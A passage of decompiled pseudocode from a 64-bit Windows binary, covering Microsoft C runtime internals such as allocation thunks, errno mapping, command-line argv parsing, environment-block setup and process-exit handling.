      *(_QWORD *)a1 = v4 + 128;
      *(_QWORD *)(a1 + 264) = v4 + 127;
      *(_QWORD *)(a1 + 272) = v5 + 128;
      *(_QWORD *)(a1 + 280) = v6 + 128;
      *(_DWORD *)(a1 + 8) = MaxCharSize_low;
    }
    else
    {
LABEL_41:
      free_base(Block);
      free_base(v4);
      free_base(v5);
      free_base(v6);
      v2 = 1;
    }
    free_base(v7);
    return v2;
  }
  else
  {
    v47 = *(volatile signed __int32 **)(a1 + 256);
    if ( v47 != nullptr )
      _InterlockedDecrement(v47);
    *(_QWORD *)(a1 + 256) = 0;
    *(_QWORD *)a1 = asc_140091010;
    *(_QWORD *)(a1 + 272) = &unk_140091290;
    *(_QWORD *)(a1 + 280) = &unk_140091410;
    *(_QWORD *)(a1 + 264) = 0;
    *(_DWORD *)(a1 + 8) = 1;
    return 0;
  }
}


// ----- j__calloc_base @ 0x1400185c0 -----
// attributes: thunk
void *__cdecl j__calloc_base(size_t Count, size_t Size)
{
  return calloc_base(Count, Size);
}


// ----- sub_1400185D0 @ 0x1400185d0 -----
void *__fastcall sub_1400185D0(__int64 a1)
{
  __int64 v2; // rbx
  __int64 v3; // rbx
  void *v4; // rax
  void *v5; // rsi

  if ( a1 == 0 )
    return nullptr;
  v2 = -1;
  do
    ++v2;
  while ( *(_WORD *)(a1 + 2 * v2) != 0 );
  v3 = v2 + 1;
  v4 = j__malloc_base(2 * v3);
  v5 = v4;
  if ( v4 == nullptr )
    return nullptr;
  if ( (unsigned int)sub_140021B30(v4, v3, a1) != 0 )
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  return v5;
}


// ----- ??$common_fsopen@_W@@YAPEAU_iobuf@@QEB_W0H@Z @ 0x140018660 -----
__int64 __fastcall common_fsopen<wchar_t>(_WORD *a1, _WORD *a2, unsigned int a3)
{
  __int64 v7; // rdx
  __int64 v8; // rcx
  __int64 v9; // rbx
  FILE *Stream; // [rsp+40h] [rbp+8h] BYREF

  if ( a1 == nullptr || a2 == nullptr || *a2 == 0 )
  {
    *(_DWORD *)sub_140018888(a1, a2) = 22;
    invalid_parameter_noinfo();
    return 0;
  }
  if ( *a1 == 0 )
  {
    *(_DWORD *)sub_140018888(a1, a2) = 22;
    return 0;
  }
  __acrt_stdio_allocate_stream(&Stream);
  if ( Stream == nullptr )
  {
    *(_DWORD *)sub_140018888(v8, v7) = 24;
    return 0;
  }
  v9 = wopenfile(a1, a2, a3);
  if ( v9 == 0 )
    __acrt_stdio_free_stream(Stream);
  unlock_file(Stream);
  return v9;
}


// ----- j_??$common_fsopen@_W@@YAPEAU_iobuf@@QEB_W0H@Z @ 0x14001872c -----
// attributes: thunk
__int64 __fastcall common_fsopen<wchar_t>(_WORD *a1, _WORD *a2, unsigned int a3)
{
  return ??$common_fsopen@_W@@YAPEAU_iobuf@@QEB_W0H@Z(a1, a2, a3);
}


// ----- j__realloc_base @ 0x140018740 -----
// attributes: thunk
void *__cdecl j__realloc_base(void *Block, size_t Size)
{
  return realloc_base(Block, Size);
}


// ----- sub_140018748 @ 0x140018748 -----
__int64 __fastcall sub_140018748(unsigned int a1)
{
  __int64 result; // rax
  unsigned __int64 v3; // rcx
  unsigned __int64 v4; // r10
  __int64 v5; // rdi
  unsigned __int64 v6; // r8
  bool v7; // zf
  unsigned __int64 v8; // r11
  char *v9; // rax
  bool v10; // cf
  unsigned __int64 v11; // rax

  if ( a1 != 0 )
  {
    if ( a1 <= 0xD )
      return dword_140091720[2 * a1 - 1];
    if ( a1 <= 0x718 )
    {
      v3 = 45;
      v4 = 0;
      v5 = 44;
      while ( 1 )
      {
        v6 = v3 >> 1;
        if ( v3 >> 1 == 0 )
          break;
        v7 = (v3 & 1) == 0;
        v3 = v6 - 1;
        if ( !v7 )
          v3 = v6;
        v8 = v3 + v4;
        v9 = (char *)&dword_140091720[2 * v3 + 2 * v4];
        v10 = a1 < *(_DWORD *)v9;
        if ( a1 == *(_DWORD *)v9 )
          goto LABEL_20;
        if ( a1 >= *(_DWORD *)v9 )
        {
          v4 = v8 + 1;
          v3 = v6;
        }
        v11 = v8 - 1;
        if ( !v10 )
          v11 = v5;
        v5 = v11;
        if ( v4 > v11 )
          goto LABEL_15;
      }
      if ( v3 == 0 )
        goto LABEL_15;
      v9 = (char *)&dword_140091720[2 * v4];
      if ( a1 != *(_DWORD *)v9 )
        v9 = nullptr;
LABEL_20:
      if ( v9 != nullptr )
        return *((unsigned int *)v9 + 1);
    }
  }
LABEL_15:
  if ( a1 - 19 <= 0x11 )
    return 13;
  result = 22;
  if ( a1 - 188 <= 0xE )
    return 8;
  return result;
}


// ----- sub_140018818 @ 0x140018818 -----
_DWORD *__fastcall sub_140018818(unsigned int a1)
{
  int v2; // ebx
  __int64 v3; // rdx
  __int64 v4; // rcx
  _DWORD *result; // rax

  *(_DWORD *)sub_140018864() = a1;
  v2 = sub_140018748(a1);
  result = (_DWORD *)sub_140018888(v4, v3);
  *result = v2;
  return result;
}


// ----- __acrt_errno_map_os_error_ptd @ 0x140018840 -----
__int64 __fastcall _acrt_errno_map_os_error_ptd(unsigned int a1, __int64 a2)
{
  __int64 result; // rax

  *(_BYTE *)(a2 + 56) = 1;
  *(_DWORD *)(a2 + 52) = a1;
  result = sub_140018748(a1);
  *(_DWORD *)(a2 + 44) = result;
  *(_BYTE *)(a2 + 48) = 1;
  return result;
}


// ----- sub_140018864 @ 0x140018864 -----
void *sub_140018864()
{
  __int64 v0; // rcx
  void *result; // rax

  v0 = sub_14001C838();
  result = (void *)(v0 + 36);
  if ( v0 == 0 )
    return &unk_14009EA74;
  return result;
}


// ----- sub_140018888 @ 0x140018888 -----
void *__fastcall sub_140018888()
{
  __int64 v0; // rcx
  void *result; // rax

  v0 = sub_14001C838();
  result = (void *)(v0 + 32);
  if ( v0 == 0 )
    return &unk_14009EA70;
  return result;
}


// ----- ?update_locale_slow@__crt_cached_ptd_host@@AEAAXXZ @ 0x1400188b0 -----
void __fastcall __crt_cached_ptd_host::update_locale_slow(__crt_cached_ptd_host *this)
{
  __int64 v2; // rsi
  int v3; // eax

  v2 = unknown_libname_79((__int64)this);
  *((_QWORD *)this + 3) = *(_QWORD *)(v2 + 144);
  *((_QWORD *)this + 4) = *(_QWORD *)(v2 + 136);
  sub_14001C9C0(v2, (char *)this + 24, *((_QWORD *)this + 1));
  sub_14001CA2C(v2, (char *)this + 32, *((_QWORD *)this + 1));
  v3 = *(_DWORD *)(v2 + 936);
  if ( (v3 & 2) == 0 )
  {
    *(_DWORD *)(v2 + 936) = v3 | 2;
    *((_BYTE *)this + 40) = 2;
  }
}


// ----- abort @ 0x140018928 -----
void __cdecl __noreturn abort()
{
  if ( _acrt_get_sigabrt_handler() != 0 )
    raise(22);
  if ( (byte_14009EB28 & 2) != 0 )
  {
    if ( IsProcessorFeaturePresent(0x17u) )
      __fastfail(7u);
    sub_14001CB80(3, 1073741845);
  }
  exit(3);
}


// ----- __strncnt @ 0x140018980 -----
size_t __cdecl _strncnt(const char *String, size_t Count)
{
  size_t result; // rax

  result = 0;
  if ( *String != 0 )
  {
    do
    {
      if ( result == Count )
        break;
      ++result;
    }
    while ( String[result] != 0 );
  }
  return result;
}


// ----- ??$__acrt_convert_wcs_mbs_cp@D_WV_lambda_7c9dea7b4ca7285d2cdb541a38da6275_@@U__crt_win32_buffer_internal_dynamic_resizing@@@@YAHQEBDAEAV?$__crt_win32_buffer@_WU__crt_win32_buffer_internal_dynamic_resizing@@@@AEBV_lambda_7c9dea7b4ca7285d2cdb541a38da6275_@@I@Z @ 0x140018998 -----
__int64 __fastcall __acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_7c9dea7b4ca7285d2cdb541a38da6275_,__crt_win32_buffer_internal_dynamic_resizing>(
        _BYTE *a1,
        __int64 a2,
        __int64 a3,
        unsigned int a4)
{
  void *v7; // rax
  unsigned int v8; // edx
  int v10; // eax
  __int64 v11; // rsi
  DWORD LastError; // eax
  void *v13; // rax
  unsigned int v14; // r8d
  int v15; // eax

  if ( a1 == nullptr )
  {
    if ( *(_BYTE *)(a2 + 40) != 0 )
    {
      free_base(*(void **)(a2 + 16));
      *(_BYTE *)(a2 + 40) = 0;
    }
    *(_QWORD *)(a2 + 16) = 0;
    *(_QWORD *)(a2 + 24) = 0;
LABEL_5:
    *(_QWORD *)(a2 + 32) = 0;
    return 0;
  }
  if ( *a1 == 0 )
  {
    if ( *(_QWORD *)(a2 + 24) == 0 )
    {
      if ( *(_BYTE *)(a2 + 40) != 0 )
      {
        free_base(*(void **)(a2 + 16));
        *(_BYTE *)(a2 + 40) = 0;
      }
      v7 = malloc_base(2u);
      *(_QWORD *)(a2 + 16) = v7;
      v8 = v7 == nullptr ? 0xC : 0;
      if ( v7 != nullptr )
        v8 = 0;
      *(_BYTE *)(a2 + 40) = v7 != nullptr;
      *(_QWORD *)(a2 + 24) = v7 != nullptr;
      if ( v8 != 0 )
        return v8;
    }
    **(_WORD **)(a2 + 16) = 0;
    goto LABEL_5;
  }
  v10 = sub_140022950(a4, 9, a1);
  v11 = v10;
  if ( v10 != 0 )
  {
    if ( (unsigned __int64)v10 > *(_QWORD *)(a2 + 24) )
    {
      if ( *(_BYTE *)(a2 + 40) != 0 )
      {
        free_base(*(void **)(a2 + 16));
        *(_BYTE *)(a2 + 40) = 0;
      }
      v13 = malloc_base(2 * v11);
      *(_QWORD *)(a2 + 16) = v13;
      v14 = v13 == nullptr ? 0xC : 0;
      if ( v13 != nullptr )
        v14 = 0;
      *(_BYTE *)(a2 + 40) = v13 != nullptr;
      *(_QWORD *)(a2 + 24) = v11 & -(__int64)(v13 != nullptr);
      if ( v14 != 0 )
        return v14;
    }
    v15 = sub_140022950(a4, 9, a1);
    if ( v15 != 0 )
    {
      *(_QWORD *)(a2 + 32) = v15 - 1LL;
      return 0;
    }
  }
  LastError = GetLastError();
  sub_140018818(LastError);
  return *(unsigned int *)sub_140018888();
}


// ----- ??$__acrt_convert_wcs_mbs_cp@_WDV_lambda_f788ae46380686e8b737efdd8c720d07_@@U__crt_win32_buffer_no_resizing@@@@YAHQEB_WAEAV?$__crt_win32_buffer@DU__crt_win32_buffer_no_resizing@@@@AEBV_lambda_f788ae46380686e8b737efdd8c720d07_@@I@Z @ 0x140018b38 -----
__int64 __fastcall __acrt_convert_wcs_mbs_cp<wchar_t,char,_lambda_f788ae46380686e8b737efdd8c720d07_,__crt_win32_buffer_no_resizing>(
        _WORD *a1,
        __int64 a2,
        __int64 a3,
        int a4)
{
  int v6; // edi
  int v8; // eax
  DWORD LastError; // eax
  unsigned __int64 v10; // rcx
  int v11; // eax

  v6 = (int)a1;
  if ( a1 == nullptr )
  {
    if ( *(_BYTE *)(a2 + 40) != 0 )
      *(_BYTE *)(a2 + 40) = 0;
    *(_QWORD *)(a2 + 16) = 0;
    *(_QWORD *)(a2 + 24) = 0;
    goto LABEL_5;
  }
  if ( *a1 != 0 )
  {
    v8 = _acrt_WideCharToMultiByte(a4, 0, (_DWORD)a1, -1, 0, 0, 0, 0);
    if ( v8 != 0 )
    {
      v10 = *(_QWORD *)(a2 + 24);
      if ( v8 > v10 )
      {
        if ( *(_BYTE *)(a2 + 40) != 0 )
          *(_BYTE *)(a2 + 40) = 0;
        goto LABEL_10;
      }
      v11 = _acrt_WideCharToMultiByte(a4, 0, v6, -1, *(_QWORD *)(a2 + 16), v10, 0, 0);
      if ( v11 != 0 )
      {
        *(_QWORD *)(a2 + 32) = v11 - 1LL;
        return 0;
      }
    }
    LastError = GetLastError();
    sub_140018818(LastError);
    return *(unsigned int *)sub_140018888();
  }
  if ( *(_QWORD *)(a2 + 24) == 0 )
  {
    if ( *(_BYTE *)(a2 + 40) != 0 )
      *(_BYTE *)(a2 + 40) = 0;
LABEL_10:
    *(_DWORD *)sub_140018888() = 34;
    *(_BYTE *)(a2 + 40) = 0;
    *(_QWORD *)(a2 + 24) = 0;
    return 34;
  }
  **(_BYTE **)(a2 + 16) = 0;
LABEL_5:
  *(_QWORD *)(a2 + 32) = 0;
  return 0;
}


// ----- sub_140018C54 @ 0x140018c54 -----
__int64 __fastcall sub_140018C54(int a1, __int64 a2)
{
  _QWORD *v4; // rax
  _QWORD *v5; // rbx
  __int64 v6; // rcx
  __int64 v7; // rax
  void (__fastcall *v9)(__int64); // r8
  __int64 v10; // rbp
  __int64 v11; // rcx
  __int64 v12; // rdx
  unsigned int v13; // edi
  __int64 v14; // rdx
  __int64 v15; // rcx

  v4 = (_QWORD *)sub_14001C838();
  v5 = v4;
  if ( v4 == nullptr )
    return 0;
  v6 = *v4;
  v7 = *v4;
  while ( *(_DWORD *)v7 != a1 )
  {
    v7 += 16;
    if ( v7 == v6 + 192 )
      return 0;
  }
  if ( v7 == 0 )
    return 0;
  v9 = *(void (__fastcall **)(__int64))(v7 + 8);
  if ( v9 == nullptr )
    return 0;
  if ( v9 == (void (__fastcall *)(__int64))5 )
  {
    *(_QWORD *)(v7 + 8) = 0;
    return 1;
  }
  if ( v9 != (void (__fastcall *)(__int64))1 )
  {
    v10 = v5[1];
    v5[1] = a2;
    if ( *(_DWORD *)(v7 + 4) != 8 )
    {
      v15 = *(unsigned int *)(v7 + 4);
      *(_QWORD *)(v7 + 8) = 0;
      v9(v15);
      goto LABEL_37;
    }
    v11 = v6 + 48;
    v12 = v11 + 144;
    while ( v11 != v12 )
    {
      *(_QWORD *)(v11 + 8) = 0;
      v11 += 16;
    }
    v13 = *((_DWORD *)v5 + 4);
    switch ( *(_DWORD *)v7 )
    {
      case 0xC000008D:
        v14 = 130;
        break;
      case 0xC000008E:
        v14 = 131;
        break;
      case 0xC000008F:
        v14 = 134;
        break;
      case 0xC0000090:
        v14 = 129;
        break;
      case 0xC0000091:
        v14 = 132;
        break;
      case 0xC0000092:
        v14 = 138;
        break;
      case 0xC0000093:
        v14 = 133;
        break;
      case 0xC00002B4:
        v14 = 142;
        break;
      default:
        v14 = v13;
        if ( *(_DWORD *)v7 != -1073741131 )
        {
LABEL_35:
          ((void (__fastcall *)(__int64, __int64, void (__fastcall *)(__int64), _QWORD))v9)(8, v14, v9, 0);
          *((_DWORD *)v5 + 4) = v13;
LABEL_37:
          v5[1] = v10;
          return 0xFFFFFFFFLL;
        }
        v14 = 141;
        break;
    }
    *((_DWORD *)v5 + 4) = v14;
    goto LABEL_35;
  }
  return 0xFFFFFFFFLL;
}


// ----- sub_140018DC0 @ 0x140018dc0 -----
__int64 sub_140018DC0()
{
  return (unsigned int)dword_1400A03E4;
}


// ----- sub_140018DC8 @ 0x140018dc8 -----
void __fastcall sub_140018DC8(int a1)
{
  dword_1400A03E4 = a1;
}


// ----- sub_140018DD0 @ 0x140018dd0 -----
void __fastcall sub_140018DD0(__int64 a1)
{
  qword_1400A03E8 = a1;
}


// ----- sub_140018DE0 @ 0x140018de0 -----
uintptr_t __fastcall sub_140018DE0(__int64 a1)
{
  uintptr_t result; // rax

  result = _security_cookie & 0x3F;
  qword_1400A03E8 = _security_cookie ^ __ROR8__(a1, 64 - (unsigned __int8)result);
  return result;
}


// ----- sub_140018E04 @ 0x140018e04 -----
char __fastcall sub_140018E04(char *a1, _QWORD *a2, _BYTE *a3, _QWORD *a4, _QWORD *a5)
{
  _BYTE *v6; // rbx
  _QWORD *v7; // r14
  bool v9; // bp
  unsigned int v10; // esi
  bool v11; // si
  char result; // al
  int v13; // edx
  unsigned int v14; // eax
  char v15; // al

  v6 = a3;
  v7 = a2;
  *a5 = 0;
  *a4 = 1;
  if ( a2 != nullptr )
  {
    *a2 = a3;
    v7 = a2 + 1;
  }
  v9 = false;
  do
  {
    if ( *a1 == 34 )
    {
      LOBYTE(v10) = 34;
      v9 = !v9;
      ++a1;
    }
    else
    {
      ++*a5;
      if ( v6 != nullptr )
        *v6++ = *a1;
      v10 = *a1++;
      if ( ismbblead(v10) != 0 )
      {
        ++*a5;
        if ( v6 != nullptr )
          *v6++ = *a1;
        ++a1;
      }
      if ( (_BYTE)v10 == 0 )
      {
        --a1;
        goto LABEL_19;
      }
    }
  }
  while ( v9 || (_BYTE)v10 != 32 && (_BYTE)v10 != 9 );
  if ( v6 != nullptr )
    *(v6 - 1) = 0;
LABEL_19:
  v11 = false;
  while ( 1 )
  {
    result = *a1;
    if ( *a1 == 0 )
      break;
    while ( result == 32 || result == 9 )
      result = *++a1;
    if ( result == 0 )
      break;
    if ( v7 != nullptr )
      *v7++ = v6;
    ++*a4;
    while ( 1 )
    {
      v13 = 1;
      v14 = 0;
      while ( *a1 == 92 )
      {
        ++a1;
        ++v14;
      }
      if ( *a1 == 34 )
      {
        if ( (v14 & 1) == 0 )
        {
          if ( v11 && a1[1] == 34 )
          {
            ++a1;
          }
          else
          {
            v13 = 0;
            v11 = !v11;
          }
        }
        v14 >>= 1;
      }
      while ( v14 != 0 )
      {
        --v14;
        if ( v6 != nullptr )
          *v6++ = 92;
        ++*a5;
      }
      v15 = *a1;
      if ( *a1 == 0 || !v11 && (v15 == 32 || v15 == 9) )
        break;
      if ( v13 != 0 )
      {
        if ( v6 != nullptr )
          *v6++ = v15;
        if ( ismbblead(*a1) != 0 )
        {
          ++*a5;
          ++a1;
          if ( v6 != nullptr )
            *v6++ = *a1;
        }
        ++*a5;
      }
      ++a1;
    }
    if ( v6 != nullptr )
      *v6++ = 0;
    ++*a5;
  }
  if ( v7 != nullptr )
    *v7 = 0;
  ++*a4;
  return result;
}


// ----- __acrt_allocate_buffer_for_argv @ 0x140018fc4 -----
void *__fastcall _acrt_allocate_buffer_for_argv(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rcx
  void *v4; // rbx

  if ( a1 >= 0x1FFFFFFFFFFFFFFFLL )
    return nullptr;
  if ( a2 >= 0xFFFFFFFFFFFFFFFFuLL / a3 )
    return nullptr;
  v3 = 8 * a1;
  if ( ~v3 <= a3 * a2 )
    return nullptr;
  v4 = calloc_base(a3 * a2 + v3, 1u);
  free_base(nullptr);
  return v4;
}


// ----- sub_140019024 @ 0x140019024 -----
__int64 __fastcall sub_140019024(int a1)
{
  unsigned int v1; // edi
  char *v3; // rsi
  unsigned __int64 v4; // r15
  _QWORD *buffer_for_argv; // rax
  void *v6; // rbx
  void *v7; // rcx
  unsigned int v8; // esi
  void *v9; // rdx
  int v10; // ecx
  _QWORD *i; // rax
  void *Block; // [rsp+68h] [rbp+38h] BYREF
  unsigned __int64 v14; // [rsp+70h] [rbp+40h] BYREF
  unsigned __int64 v15; // [rsp+78h] [rbp+48h] BYREF

  v1 = 0;
  if ( a1 != 0 )
  {
    if ( (unsigned int)(a1 - 1) > 1 )
    {
      v1 = 22;
      *(_DWORD *)sub_140018888() = 22;
      invalid_parameter_noinfo();
      return v1;
    }
    _acrt_initialize_multibyte();
    _acrt_GetModuleFileNameA(0, &unk_1400A03F0, 260);
    v3 = (char *)qword_1400A0550;
    qword_1400A0530 = (__int64)&unk_1400A03F0;
    if ( qword_1400A0550 == 0 || *(_BYTE *)qword_1400A0550 == 0 )
      v3 = (char *)&unk_1400A03F0;
    v14 = 0;
    v15 = 0;
    sub_140018E04(v3, nullptr, nullptr, &v14, &v15);
    v4 = v14;
    buffer_for_argv = _acrt_allocate_buffer_for_argv(v14, v15, 1u);
    v6 = buffer_for_argv;
    if ( buffer_for_argv != nullptr )
    {
      sub_140018E04(v3, buffer_for_argv, &buffer_for_argv[v4], &v14, &v15);
      if ( a1 != 1 )
      {
        Block = nullptr;
        v8 = common_expand_argv_wildcards<char>(v6, &Block);
        if ( v8 != 0 )
        {
          free_base(Block);
          Block = nullptr;
          free_base(v6);
          return v8;
        }
        v9 = Block;
        v10 = 0;
        for ( i = Block; *i != 0; ++v10 )
          ++i;
        dword_1400A0538 = v10;
        Block = nullptr;
        qword_1400A0540 = v9;
        free_base(nullptr);
        v7 = v6;
        Block = nullptr;
LABEL_17:
        free_base(v7);
        return v1;
      }
      qword_1400A0540 = v6;
      dword_1400A0538 = v14 - 1;
    }
    else
    {
      v1 = 12;
      *(_DWORD *)sub_140018888() = 12;
    }
    v7 = nullptr;
    goto LABEL_17;
  }
  return v1;
}


// ----- ??$common_initialize_environment_nolock@D@@YAHXZ @ 0x1400191a4 -----
__int64 common_initialize_environment_nolock<char>()
{
  unsigned int v0; // edi
  __int64 narrow_environment_from_os; // rax
  void *v3; // rbx
  void *v4; // rax

  v0 = 0;
  if ( qword_1400A04F8 != nullptr )
    return 0;
  _acrt_initialize_multibyte();
  narrow_environment_from_os = _dcrt_get_narrow_environment_from_os();
  v3 = (void *)narrow_environment_from_os;
  if ( narrow_environment_from_os != 0 )
  {
    v4 = (void *)create_environment<char>(narrow_environment_from_os);
    if ( v4 != nullptr )
    {
      qword_1400A0510 = v4;
      qword_1400A04F8 = v4;
    }
    else
    {
      v0 = -1;
    }
    free_base(nullptr);
    free_base(v3);
    return v0;
  }
  else
  {
    free_base(nullptr);
    return 0xFFFFFFFFLL;
  }
}


// ----- ??$create_environment@D@@YAQEAPEADQEAD@Z @ 0x140019218 -----
void *__fastcall create_environment<char>(char *a1)
{
  __int64 v2; // rcx
  char *v3; // r8
  char i; // dl
  __int64 v5; // rax
  __int64 v6; // rax
  void *v7; // rax
  void *v8; // rbx
  _QWORD *v10; // r14
  __int64 v11; // rbp
  size_t v12; // rbp
  void *v13; // rax
  void *v14; // rdi

  v2 = 0;
  v3 = a1;
  for ( i = *a1; i != 0; i = *v3 )
  {
    v5 = v2 + 1;
    if ( i == 61 )
      v5 = v2;
    v2 = v5;
    v6 = -1;
    do
      ++v6;
    while ( v3[v6] != 0 );
    v3 += v6 + 1;
  }
  v7 = calloc_base(v2 + 1, 8u);
  v8 = v7;
  if ( v7 == nullptr )
    goto LABEL_9;
  v10 = v7;
  while ( 1 )
  {
    if ( *a1 == 0 )
    {
      free_base(nullptr);
      return v8;
    }
    v11 = -1;
    do
      ++v11;
    while ( a1[v11] != 0 );
    v12 = v11 + 1;
    if ( *a1 != 61 )
      break;
LABEL_17:
    a1 += v12;
  }
  v13 = calloc_base(v12, 1u);
  v14 = v13;
  if ( v13 != nullptr )
  {
    if ( (unsigned int)sub_14001BA50(v13, v12, a1) != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    *v10++ = v14;
    free_base(nullptr);
    goto LABEL_17;
  }
  unknown_libname_81(v8);
  free_base(nullptr);
LABEL_9:
  free_base(nullptr);
  return nullptr;
}


// ----- unknown_libname_81 @ 0x14001932c -----
// Microsoft VisualC 64bit universal runtime
void __fastcall unknown_libname_81(void **Block)
{
  void *v1; // rax
  void **v3; // rdi

  if ( Block != nullptr )
  {
    v1 = *Block;
    v3 = Block;
    while ( v1 != nullptr )
    {
      free_base(v1);
      v1 = *++v3;
    }
    free_base(Block);
  }
}


// ----- ??$initialize_environment_by_cloning_nolock@D@@YAHXZ @ 0x140019370 -----
__int64 initialize_environment_by_cloning_nolock<char>()
{
  __int64 *v0; // rdi
  __int64 result; // rax
  int v2; // esi
  void *v3; // rax
  void *v4; // rbx
  int v5; // eax
  void *v6; // rcx

  v0 = (__int64 *)qword_1400A0500;
  if ( qword_1400A0500 == 0 )
    return 0xFFFFFFFFLL;
  while ( 1 )
  {
    result = *v0;
    if ( *v0 == 0 )
      return result;
    v2 = _acrt_WideCharToMultiByte(0, 0, result, -1, 0, 0, 0, 0);
    if ( v2 == 0 )
      return 0xFFFFFFFFLL;
    v3 = calloc_base(v2, 1u);
    v4 = v3;
    if ( v3 == nullptr )
    {
      v6 = nullptr;
LABEL_10:
      free_base(v6);
      return 0xFFFFFFFFLL;
    }
    v5 = _acrt_WideCharToMultiByte(0, 0, *v0, -1, (_DWORD)v3, v2, 0, 0);
    v6 = v4;
    if ( v5 == 0 )
      goto LABEL_10;
    common_set_variable_in_environment_nolock<char>(v4);
    free_base(nullptr);
    ++v0;
  }
}


// ----- sub_140019450 @ 0x140019450 -----
void __fastcall sub_140019450(void ***a1)
{
  void **v1; // rcx

  v1 = *a1;
  if ( v1 != qword_1400A0510 )
    unknown_libname_81(v1);
}


// ----- sub_14001946C @ 0x14001946c -----
void __fastcall sub_14001946C(void ***a1)
{
  void **v1; // rcx

  v1 = *a1;
  if ( v1 != qword_1400A0508 )
    unknown_libname_81(v1);
}


// ----- unknown_libname_82 @ 0x140019488 -----
// Microsoft VisualC 64bit universal runtime
void *unknown_libname_82()
{
  void *result; // rax

  result = qword_1400A04F8;
  if ( qword_1400A04F8 == nullptr )
  {
    if ( qword_1400A0500 == 0
      || (unsigned int)common_initialize_environment_nolock<char>() != 0
      && (unsigned int)initialize_environment_by_cloning_nolock<char>() != 0 )
    {
      return nullptr;
    }
    else
    {
      return qword_1400A04F8;
    }
  }
  return result;
}


// ----- __dcrt_uninitialize_environments_nolock @ 0x1400194c4 -----
void _dcrt_uninitialize_environments_nolock()
{
  sub_140019450((void ***)&qword_1400A04F8);
  sub_14001946C((void ***)&qword_1400A0500);
  unknown_libname_81((void **)qword_1400A0510);
  unknown_libname_81((void **)qword_1400A0508);
}


// ----- unknown_libname_83 @ 0x140019508 -----
// Microsoft VisualC 64bit universal runtime
void *unknown_libname_83()
{
  void *result; // rax

  result = qword_1400A0510;
  if ( qword_1400A0510 == nullptr )
  {
    result = qword_1400A04F8;
    if ( qword_1400A04F8 == nullptr )
    {
      if ( qword_1400A0500 == 0
        || (unsigned int)common_initialize_environment_nolock<char>() != 0
        && (unsigned int)initialize_environment_by_cloning_nolock<char>() != 0 )
      {
        result = nullptr;
      }
      else
      {
        result = qword_1400A04F8;
      }
    }
    qword_1400A0510 = result;
  }
  return result;
}


// ----- j_??$common_initialize_environment_nolock@D@@YAHXZ @ 0x140019558 -----
// attributes: thunk
__int64 common_initialize_environment_nolock<char>(void)
{
  return ??$common_initialize_environment_nolock@D@@YAHXZ();
}


// ----- sub_140019560 @ 0x140019560 -----
void __fastcall sub_140019560(void (**a1)(void), void (**a2)(void))
{
  void (**v3)(void); // rbx

  if ( a1 != a2 )
  {
    v3 = a1;
    do
    {
      if ( *v3 != nullptr )
        (*v3)();
      ++v3;
    }
    while ( v3 != a2 );
  }
}


// ----- sub_140019598 @ 0x140019598 -----
__int64 __fastcall sub_140019598(__int64 (**a1)(void), __int64 (**a2)(void))
{
  __int64 (**v3)(void); // rbx
  __int64 result; // rax

  v3 = a1;
  if ( a1 == a2 )
    return 0;
  while ( 1 )
  {
    if ( *v3 != nullptr )
    {
      result = (*v3)();
      if ( (_DWORD)result != 0 )
        break;
    }
    if ( ++v3 == a2 )
      return 0;
  }
  return result;
}


// ----- ??$?RV_lambda_99476a1ad63dd22509b5d3e65b0ffc95_@@AEAV_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_@@V_lambda_f7424dd8d45958661754dc4f2697e9c3_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_99476a1ad63dd22509b5d3e65b0ffc95_@@AEAV_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_@@$$QEAV_lambda_f7424dd8d45958661754dc4f2697e9c3_@@@Z @ 0x1400195d4 -----
void __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_99476a1ad63dd22509b5d3e65b0ffc95_,_lambda_ad1ced32f4ac17aa236e5ef05d6b3b7c_ &,_lambda_f7424dd8d45958661754dc4f2697e9c3_>(
        __int64 a1,
        int *a2,
        __int64 a3,
        int *a4)
{
  _vcrt_lock(*a2);
  sub_14001960C(a3);
  _vcrt_unlock(*a4);
}


// ----- sub_14001960C @ 0x14001960c -----
int *__fastcall sub_14001960C(int **a1)
{
  int v2; // ecx
  _onexit_table_t *v3; // rcx
  int *result; // rax

  if ( byte_1400A0528 != 0 )
    return result;
  _InterlockedExchange(&dword_1400A0518, 1);
  v2 = **a1;
  if ( v2 == 0 )
  {
    if ( qword_1400A0520 != _security_cookie )
      ((void (__fastcall *)(_QWORD, _QWORD, _QWORD))__ROR8__(
                                                      qword_1400A0520 ^ _security_cookie,
                                                      _security_cookie & 0x3F))(
        0,
        0,
        0);
    v3 = &stru_1400A0578;
    goto LABEL_8;
  }
  if ( v2 == 1 )
  {
    v3 = &Table;
LABEL_8:
    execute_onexit_table(v3);
  }
  if ( **a1 == 0 )
    sub_140019560(&qword_14002D440, &qword_14002D460);
  sub_140019560(&qword_14002D468, qword_14002D470);
  result = a1[1];
  if ( *result == 0 )
  {
    byte_1400A0528 = 1;
    result = a1[2];
    *(_BYTE *)result = 1;
  }
  return result;
}


// ----- ?common_exit@@YAXHW4_crt_exit_cleanup_mode@@W4_crt_exit_return_mode@@@Z @ 0x1400196cc -----
void __fastcall common_exit(unsigned int a1, enum _crt_exit_cleanup_mode a2, enum _crt_exit_return_mode a3)
{
  HMODULE ModuleHandleW; // rax
  char *v5; // rcx
  __int64 v6; // rcx
  __int64 v7; // [rsp+0h] [rbp-50h] BYREF
  _BYTE v8[4]; // [rsp+20h] [rbp-30h] BYREF
  int v9; // [rsp+24h] [rbp-2Ch] BYREF
  int v10; // [rsp+28h] [rbp-28h] BYREF
  __int64 v11; // [rsp+30h] [rbp-20h]
  _QWORD v12[3]; // [rsp+38h] [rbp-18h] BYREF
  enum _crt_exit_cleanup_mode v13; // [rsp+68h] [rbp+18h] BYREF
  enum _crt_exit_return_mode v14; // [rsp+70h] [rbp+20h] BYREF
  char v15; // [rsp+78h] [rbp+28h] BYREF

  v14 = a3;
  v13 = a2;
  v11 = -2;
  if ( a3 == _crt_exit_terminate_process )
  {
    ModuleHandleW = GetModuleHandleW(nullptr);
    if ( ModuleHandleW != nullptr && *(_WORD *)ModuleHandleW == 23117 )
    {
      v5 = (char *)ModuleHandleW + *((int *)ModuleHandleW + 15);
      if ( *(_DWORD *)v5 == 17744
        && *((_WORD *)v5 + 12) == 523
